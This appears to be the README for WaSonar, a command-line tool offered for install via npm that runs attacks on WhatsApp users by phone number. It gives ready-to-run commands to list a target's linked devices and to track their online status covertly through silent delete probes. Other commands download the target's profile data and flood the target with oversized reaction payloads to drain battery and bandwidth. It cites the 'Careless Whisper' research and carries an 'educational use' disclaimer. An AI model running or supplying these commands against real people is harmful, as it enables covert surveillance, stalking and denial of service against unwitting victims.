<div align="center">

<img src="assets/wasonar_logo.png" alt="WaSonar Logo" width="25%" />


<img src="assets/ss.png" alt="screenshot" width="100%" />

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Version](https://img.shields.io/badge/version-1.0.0-green.svg)
![Node.js](https://img.shields.io/badge/node.js-%3E%3D14.0.0-orange.svg)

> **Disclaimer**: This tool is for educational purposes and security research only. The developers are not responsible for misuse. Please use responsibly and ethically.

**WaSonar** is a powerful CLI tool designed for educational research, device tracking, and stress testing on the WhatsApp protocol. Built on top of [Baileys](https://github.com/WhiskeySockets/Baileys).

[Features](#features) • [Installation](#installation) • [Usage](#usage) 


</div>

---

## Features

- **Real-time Device Tracking**: Detect exact online/offline status of *all* linked devices (Phone, Web, Desktop).
- **Device Discovery**: List all devices linked to a target number (Main phone + Companion devices).
- **Profile Extraction**: Fetch profile pictures, status/about info, and JIDs.
- **Resource Exhaustion**: Overwhelm devices using oversized reaction payloads (Aggressive/Slow modes).
## Installation

### Via NPM (Recommended)
```bash
npm install -g wasonar-cli
```

### Via NPX (No installation required)
```bash
npx wasonar-cli <command>
```

### From Source
```bash
git clone https://github.com/AjayAntoIsDev/wasonar.git
cd wasonar
npm install
```


## Usage

### 1. Login
First, you need to authenticate with a WhatsApp account (the "scanner").
```bash
wasonar-cli login
```
Scan the QR code that appears in your terminal.

### 2. Device Discovery
List all devices connected to a target number.
```bash
wasonar-cli devices <target-number>

# Example:
wasonar-cli devices 919876543210
```

### 3. Online Status & RTT (The "Sonar")
The core feature. Send silent probes to detect if devices are online and measure latency.
```bash
# Probe infinite times (default)
wasonar-cli online 919876543210

# Send specific number of probes
wasonar-cli online 919876543210 --probes 5

# Save results to file
wasonar-cli online 919876543210 --output ./logs
```
*Note: PENDING/OFFLINE means the server received the message, but the target device did not acknowledge receipt.*

### 4. Profile Extraction
Get the user's profile picture and status.
```bash
# Display info and download profile picture
wasonar-cli profile 919876543210 --output ./profiles
```

### 5. Resource Exhaustion
**⚠️ FOR EDUCATIONAL USE ONLY.** Send high-frequency oversized payloads.
```bash
# Aggressive mode (Default: 250 req/s, 1KB payload)
wasonar-cli exhaust 919876543210

# Slow mode (10 req/s, 500B payload)
wasonar-cli exhaust 919876543210 --aggression slow

# Set duration
wasonar-cli exhaust 919876543210 --duration 30
```


## Methodology

### Silent Probes
WaSonar uses "Silent Delete Probes" to detect online status without alerting the target.
1.  Sends a `revoked` (delete) message for a non-existent message ID.
2.  The target device receives this "delete" request.
3.  If online, the device sends a `delivery_receipt` (status 3) for the protocol message.
4.  WaSonar captures this receipt to confirm online status and calculate RTT.

### Exhaustion Attack
Based on the "Careless Whisper" research, this attack exploits the validation gap in WhatsApp's reaction handling.

#### Technical Details
Although reactions are not displayed on the target's phone if invalid, they are still received and processed.
- **Payload Limits**: WhatsApp servers allow reaction payloads up to **1 MB**.
- **Processing**: The client attempts to process these messages before discarding them (limit ~30 bytes for valid display), consuming resources.

#### Impact Analysis
Research data indicates significant potential for resource exhaustion:
- **Traffic Inflation**: A single session can generate **~3.7 MB/s** (13.3 GB/hour) of covert traffic.
- **Battery Drainage**: Rapid processing of these messages can drain **14-18% battery per hour** on modern smartphones (tested on iPhone 13 Pro, S23) while the device is in standby.
- **Denial of Service**: The bandwidth consumption can lead to denial of service for other applications on the victim's device.



## Citation
Based on research by Gegenhuber et al., University of Vienna & SBA Research:

```bibtex
@inproceedings{gegenhuber2024careless,
  title={Careless Whisper: Exploiting Silent Delivery Receipts to Monitor Users on Mobile Instant Messengers},
  author={Gegenhuber, Gabriel K. and G{\"u}nther, Maximilian and Maier, Markus and Judmayer, Aljosha and Holzbauer, Florian and Frenzel, Philipp {\'E}. and Ullrich, Johanna},
  year={2024},
  organization={University of Vienna, SBA Research}
}
```

---
Created by [AjayAnto](https://github.com/AjayAntoIsDev)

